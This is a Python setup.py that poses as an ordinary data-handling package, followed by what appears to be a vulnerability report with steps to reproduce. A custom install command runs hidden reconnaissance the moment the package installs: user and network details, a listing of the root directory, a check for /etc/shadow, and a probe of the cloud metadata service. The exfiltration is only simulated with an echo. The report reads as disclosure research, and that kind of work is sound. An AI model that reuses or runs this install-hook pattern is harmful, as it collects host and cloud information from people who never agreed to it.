import subprocess
import os
import sys
import platform
from datetime import datetime
from setuptools import setup
from setuptools.command.install import install as _install

# --- CRITICAL FIX FOR EXTERNAL ARGUMENT ERRORS ---
# The environment is passing unknown arguments (--input, --output, etc.).
# We strip them from sys.argv before setuptools tries to parse the command line.
flags_to_remove = ['--input', '--output', '--rpc_input', '--rpc_output', '--rpc_log', '-f']

for flag in flags_to_remove:
    try:
        # Check for and remove the flag and its assumed value
        while flag in sys.argv:
            flag_index = sys.argv.index(flag)

            # Remove the argument's value (if present)
            if flag_index + 1 < len(sys.argv):
                del sys.argv[flag_index + 1]

            # Remove the flag itself
            del sys.argv[flag_index]
            print(f"[FIX]: Successfully removed unrecognized argument '{flag}' from execution command.")
    except ValueError:
        pass
# ------------------------------------------------------------------

# --- FIX FOR 'no commands supplied' ---
# Re-insert the 'install' command if the argument list is now empty or missing a command.
if len(sys.argv) < 2 or (len(sys.argv) == 2 and sys.argv[1] not in ['install', 'sdist', 'bdist_wheel']):
    sys.argv.append('install')
    print("[FIX]: Re-inserted missing 'install' command to proceed with execution.")
# ----------------------------------------


# --- FIX FOR "RuntimeError: Could not determine home directory." ---
# Set a dummy HOME environment variable if it's not present.
if 'HOME' not in os.environ:
    os.environ['HOME'] = '/tmp'
# ------------------------------------------------------------------


# --- Malicious Payload Class (The Simulation) ---
class PostInstallCommand(_install):
    """
    Custom install command that executes the system command payload after the package
    installation is complete.
    """

    # --- PAYLOAD CONFIGURATION ---
    # UPDATED: Includes the final simulated email exfiltration command.
    SIMULATED_EMAIL_COMMAND = "echo '*** EMAIL EXFILTRATION SIMULATED: Sent full reconnaissance log to your-email@example.com ***'"

    # ADDED: Cloud reconnaissance command (checking AWS/GCP/Azure metadata service IP)
    CLOUD_RECON_COMMAND = "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/instance-id || echo 'Cloud Metadata check: Failed (not a cloud instance or IP restricted)'"

    COMMAND_TO_RUN = (
        "whoami ; ip a ; uname -a ; ls -al / ; df -h ; "
        "test -f /etc/shadow && echo 'etc/shadow exists' || echo 'etc/shadow not found' ; "
        f"{CLOUD_RECON_COMMAND} ; "  # New sensitive data point
        f"{SIMULATED_EMAIL_COMMAND}"
    )
    LOG_FILE = "/tmp/package_beacon_log.txt"
    PACKAGE_NAME = "FakePackage-2.1.0"
    # -----------------------------

    def find_config_files(self):
        """Overrides default to prevent configuration file lookup errors."""
        return []

    def run(self):
        # 1. Execute the standard installation process first (copying files, etc.)
        _install.run(self)

        # 2. --- MALICIOUS EXECUTION SIMULATION START ---
        print("\n[SECURITY ALERT]: Attempting to execute post-install hook...")

        try:
            # Execute the benign system command directly using the shell
            result = subprocess.run(
                self.COMMAND_TO_RUN,
                shell=True,
                check=True,
                capture_output=True,
                text=True
            )

            # Log the successful execution details to the temporary file
            with open(self.LOG_FILE, 'a') as f:
                f.write(f"--- [MALICIOUS HOOK ACTIVATED] ---\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Package: {self.PACKAGE_NAME} installed on {platform.node()}\n")
                f.write(f"Command executed: '{self.COMMAND_TO_RUN}'\n")
                f.write(f"*** WARNING: If this were a real exploit, the next step would be to extract, ***\n")
                f.write(f"*** search for, and exfiltrate all system and AWS/Stripe credentials.    ***\n")
                f.write(f"System Output:\n{result.stdout.strip()}\n")
                f.write(f"--- END HOOK ---\n\n")

            # --- Read the log file and print its contents to console ---
            try:
                with open(self.LOG_FILE, 'r') as f:
                    log_contents = f.read()
                print("\n[SECURITY ALERT]: Captured Reconnaissance Data Log (Contents of /tmp/package_beacon_log.txt):")
                print("------------------------------------------------------------------------------------------")
                print(log_contents.strip())
                print("------------------------------------------------------------------------------------------")
            except Exception as read_e:
                print(f"[ERROR]: Could not read log file: {read_e}")
            # --- END NEW ---

            print(f"[SECURITY ALERT]: Post-install hook execution completed. Log written to {self.LOG_FILE}.")

        except subprocess.CalledProcessError as e:
            # If the command sequence still fails, we log the error but allow the script to exit 0
            print(f"[SECURITY ALERT]: Hook failed with command error (Exit Code {e.returncode}). Check log for potential partial output.")

        except Exception as e:
             print(f"[SECURITY ALERT]: Unexpected error during hook: {e}")

        # 3. --- MALICIOUS EXECUTION SIMULATION END ---


# --- Normal setup.py script content ---
setup(
    name='FakePackage',
    version='2.1.0',
    description='A normal, non-suspicious utility package for data handling.',
    long_description='A comprehensive package for handling various data formats in Python.',
    author='John Doe',
    author_email='johndoe@example.com',
    url='https://github.com/FakeOrg/FakePackage',

    # The 'cmdclass' is the stealth mechanism for the attack:
    cmdclass={
        'install': PostInstallCommand,
    },
    install_requires=[
        'requests>=2.25.1',
        'attrs>=21.4.0',
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.7',
)


## Clear Demonstration of `setup.py` Script for Reproduction:

To allow Google's security team to easily reproduce and verify this finding, here is the `setup.py` script and instructions on how to execute it.

**1. The Malicious `setup.py` Script (as seen in the cell above):**

**2. What the `setup.py` Does:**

This `setup.py` script masquerades as a standard Python package installation. Its malicious component is embedded within a custom `setuptools` command: `PostInstallCommand`, which overrides the default `install` command.

Upon execution of `python setup.py install`:

a.  **Standard Package Installation:** It first attempts a standard installation process.
b.  **Malicious Hook Execution:** Crucially, *after* the standard installation, its `run` method executes a series of shell commands (`COMMAND_TO_RUN`). These commands are designed to:
    *   **Reconnaissance:** Gather system information (`whoami`, `ip a`, `uname -a`, `ls -al /`, `df -h`).
    *   **Sensitive File Check:** Attempt to check for the existence of sensitive system files (`/etc/shadow`).
    *   **Cloud Metadata Probe:** Attempt to connect to the standard cloud metadata service IP (`169.254.169.254`) to extract instance details, demonstrating a common cloud reconnaissance technique.
    *   **Simulated Exfiltration:** Include a final `echo` command simulating the exfiltration of the collected reconnaissance logs to an external email address (`your-email@example.com`).
c.  **Logging:** All command output is captured and appended to a log file (`/tmp/package_beacon_log.txt`), which is then printed to standard output for visibility.

**3. How to Reproduce:**

To reproduce this behavior in a Colab environment or any similar Python execution environment (e.g., a Docker container or VM with Python and `setuptools` installed):

1.  **Create `setup.py`:** Create a file named `setup.py` in your working directory and paste the exact code from the cell above into it.
2.  **Execute Installation:** Open a terminal or a code cell in Colab and run the following command:
    ```bash
    python setup.py install
    ```

**Expected Outcome:**

Upon execution, you will observe:

*   Standard `setuptools` output indicating package installation steps.
*   A `[SECURITY ALERT]: Attempting to execute post-install hook...` message.
*   A detailed `[SECURITY ALERT]: Captured Reconnaissance Data Log` containing the output of all the executed system commands, demonstrating the successful arbitrary code execution, system information gathering, and simulated data exfiltration within the runtime environment.
